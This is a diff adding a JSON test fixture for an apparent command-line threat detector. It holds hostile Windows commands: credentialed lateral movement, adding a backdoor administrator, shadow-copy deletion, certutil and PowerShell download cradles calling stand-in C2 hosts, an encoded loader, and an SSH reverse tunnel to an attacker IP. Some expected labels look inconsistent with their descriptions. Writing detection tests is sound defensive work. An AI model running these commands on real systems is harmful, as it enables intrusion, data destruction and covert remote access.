@@ -1,0 +1,170 @@
+[
+  {
+    "id": "net-use-admin-share",
+    "description": "net use connecting to ADMIN$ share with explicit credentials — lateral movement via SMB",
+    "source": "MITRE ATT&CK T1021.002 ; CISA AA23-165A LockBit",
+    "command": "net use \\\\10.10.5.30\\admin$ /user:CORP\\Administrator P@ssw0rd!2024 /persistent:no",
+    "expect": {
+      "classes": ["lateral_movement"],
+      "min_confidence": {"lateral_movement": "medium"},
+      "techniques": ["T1021.002"]
+    },
+    "reject": {"classes": ["impact", "credential_theft", "dropper"]}
+  },
+  {
+    "id": "net-localgroup-admin-add",
+    "description": "net localgroup administrators adding domain user — privilege escalation for lateral movement",
+    "source": "MITRE ATT&CK T1098 ; CISA AA22-321A",
+    "command": "net localgroup administrators CORP\\backdoor_user /add",
+    "expect": {
+      "classes": ["recon"],
+      "min_confidence": {"recon": "low"},
+      "techniques": ["T1069"]
+    },
+    "reject": {"classes": ["impact", "dropper", "loader"]}
+  },
+  {
+    "id": "nltest-dclist-recon",
+    "description": "nltest /dclist enumerating domain controllers — AD recon first step",
+    "source": "MITRE ATT&CK T1482 ; Mandiant M-Trends 2023",
+    "command": "nltest /dclist:corp.local",
+    "expect": {
+      "classes": ["recon"],
+      "min_confidence": {"recon": "medium"},
+      "techniques": ["T1482"]
+    },
+    "reject": {"classes": ["impact", "dropper", "loader", "credential_theft"]}
+  },
+  {
+    "id": "nltest-domain-trusts",
+    "description": "nltest /domain_trusts enumerating AD trust relationships — forest reconnaissance",
+    "source": "MITRE ATT&CK T1482 ; CISA AA23-144A Volt Typhoon",
+    "command": "nltest /domain_trusts /all_trusts",
+    "expect": {
+      "classes": ["recon"],
+      "min_confidence": {"recon": "medium"},
+      "techniques": ["T1482"]
+    },
+    "reject": {"classes": ["impact", "dropper", "loader", "credential_theft"]}
+  },
+  {
+    "id": "sc-remote-service-lateral",
+    "description": "sc.exe remotely creating a service on another host — lateral movement via service control",
+    "source": "MITRE ATT&CK T1543.003, T1021.002 ; CISA AA21-265A Conti",
+    "command": "sc \\\\10.10.5.25 create EvilSvc binpath= \"C:\\Windows\\Temp\\payload.exe\" start= auto",
+    "expect": {
+      "classes": ["lateral_movement"],
+      "min_confidence": {"lateral_movement": "high"},
+      "techniques": ["T1021.002", "T1543.003"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "wmic-shadow-delete-impact",
+    "description": "wmic shadowcopy delete via local WMIC — inhibits system recovery (ransomware pattern)",
+    "source": "MITRE ATT&CK T1490 ; CISA AA21-265A Conti",
+    "command": "wmic.exe shadowcopy delete /nointeractive",
+    "expect": {
+      "classes": ["impact"],
+      "min_confidence": {"impact": "high"},
+      "techniques": ["T1490"]
+    },
+    "reject": {"classes": ["dropper", "loader", "credential_theft"]}
+  },
+  {
+    "id": "defanged-url-certutil-download",
+    "description": "Defanged URL (hxxp, [.]) notation — should still detect dropper, not prevent detection",
+    "source": "MITRE ATT&CK T1105 ; analyst defanging convention",
+    "command": "certutil.exe -urlcache -split -f hxxp://185[.]220[.]101[.]34/tools/nc64[.]exe C:\\Windows\\Temp\\nc64.exe",
+    "expect": {
+      "classes": ["dropper"],
+      "min_confidence": {"dropper": "high"},
+      "techniques": ["T1105"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "net-user-enum-recon",
+    "description": "net user /domain enumerating domain user accounts — AD reconnaissance",
+    "source": "MITRE ATT&CK T1087.002 ; Mandiant M-Trends 2023",
+    "command": "net user /domain",
+    "expect": {
+      "classes": ["recon"],
+      "min_confidence": {"recon": "low"},
+      "techniques": ["T1087"]
+    },
+    "reject": {"classes": ["impact", "dropper", "loader", "credential_theft"]}
+  },
+  {
+    "id": "psexec-remote-exec",
+    "description": "PsExec remote command execution — classic lateral movement tool used by many APT groups",
+    "source": "MITRE ATT&CK T1570, T1021.002 ; CISA AA21-265A Conti",
+    "command": "PsExec.exe \\\\10.10.5.50 -u CORP\\Administrator -p P@ssw0rd cmd.exe /c whoami & ipconfig",
+    "expect": {
+      "classes": ["lateral_movement", "recon"],
+      "min_confidence": {"lateral_movement": "high"},
+      "techniques": ["T1570", "T1021.002"]
+    },
+    "reject": {"classes": ["impact", "credential_theft", "dropper"]}
+  },
+  {
+    "id": "invoke-command-remote-ps",
+    "description": "Invoke-Command -ComputerName executing encoded payload on a remote host via WinRM",
+    "source": "MITRE ATT&CK T1021.006 ; CISA AA22-321A",
+    "command": "Invoke-Command -ComputerName DC01.corp.local -ScriptBlock { IEX((New-Object Net.WebClient).DownloadString('hxxp://c2[.]xyz/agent.ps1')) } -Credential $cred",
+    "expect": {
+      "classes": ["lateral_movement", "dropper"],
+      "min_confidence": {"lateral_movement": "high", "dropper": "high"},
+      "techniques": ["T1021.006", "T1105"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "dsquery-ad-enum",
+    "description": "dsquery computer enumerating all AD computers — domain reconnaissance prior to lateral movement",
+    "source": "MITRE ATT&CK T1087.002 ; Mandiant M-Trends 2023",
+    "command": "dsquery computer -limit 500 > C:\\Windows\\Temp\\computers.txt",
+    "expect": {
+      "classes": ["recon"],
+      "min_confidence": {"recon": "medium"},
+      "techniques": ["T1087.002"]
+    },
+    "reject": {"classes": ["impact", "dropper", "credential_theft"]}
+  },
+  {
+    "id": "ssh-port-forward-c2",
+    "description": "SSH reverse tunnel forwarding internal port to attacker — covert C2 channel",
+    "source": "MITRE ATT&CK T1572, T1021.004 ; CISA AA23-144A Volt Typhoon",
+    "command": "ssh -R 4444:localhost:3389 attacker@185.220.101.34 -p 443 -N -f",
+    "expect": {
+      "classes": ["data_staging"],
+      "min_confidence": {"data_staging": "high"},
+      "techniques": ["T1572", "T1021.004"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "winrs-remote-exec",
+    "description": "winrs -r: executing remote command via WS-Management — lightweight WinRM lateral movement",
+    "source": "MITRE ATT&CK T1021.006 ; CISA AA23-144A Volt Typhoon",
+    "command": "winrs -r:10.10.5.40 -u:CORP\\Administrator cmd /c powershell -ep bypass -w hidden -enc JABwACAAPQAgACIAaAB0AHQAcAA6AC8ALwBjADIALgB4AHkAegAvAGEAIgA7AGkAZQB4ACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJABwACkAKQA=",
+    "expect": {
+      "classes": ["lateral_movement", "loader", "defense_evasion"],
+      "min_confidence": {"lateral_movement": "high", "loader": "high"},
+      "techniques": ["T1021.006", "T1059.001"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "net-view-domain-enum",
+    "description": "net view /domain enumerating computers in the domain — discovery prior to lateral movement",
+    "source": "MITRE ATT&CK T1018 ; Mandiant M-Trends 2022",
+    "command": "net view /domain:CORP",
+    "expect": {
+      "classes": ["recon"],
+      "min_confidence": {"recon": "medium"},
+      "techniques": ["T1018"]
+    },
+    "reject": {"classes": ["impact", "dropper", "credential_theft", "loader"]}
+  }
+]
